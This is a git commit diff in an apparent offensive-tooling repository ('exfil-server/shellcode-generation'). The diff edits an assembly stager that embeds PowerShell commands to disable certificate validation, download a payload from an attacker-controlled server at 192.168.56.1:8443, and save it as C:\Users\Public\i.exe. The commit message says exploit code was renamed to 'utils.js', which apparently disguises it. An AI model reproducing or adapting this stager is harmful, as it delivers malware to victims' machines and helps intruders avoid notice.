39c7d76a5244bf7b22aa1ba4fc653e775ed2c56b
JacobTaylor3 <jacobtaylor048@gmail.com>
2026-04-22 00:38:00 -0400

    Changed exploit.js to utils.js

--- exfil-server/shellcode-generation/bin/stager_patched.asm
+++ exfil-server/shellcode-generation/bin/stager_patched.asm
@@ -118,7 +118,7 @@ cmd:
     db '[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'
     db '[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;'
     db '(New-Object Net.WebClient).DownloadFile('
-    db 0x27, 'https://192.168.56.1:8443/update/5b7494537234adc7da155fc48e297943638b519a21fc360075b4ff138c2011a2', 0x27
+    db 0x27, 'https://192.168.56.1:8443/update/1eed0e8913189d0f6edae2ad4065d09c8deb57f04a8cef87e6829cf1f808079c', 0x27
     db ','
     db 0x27, 'C:\Users\Public\i.exe', 0x27
     db ');'
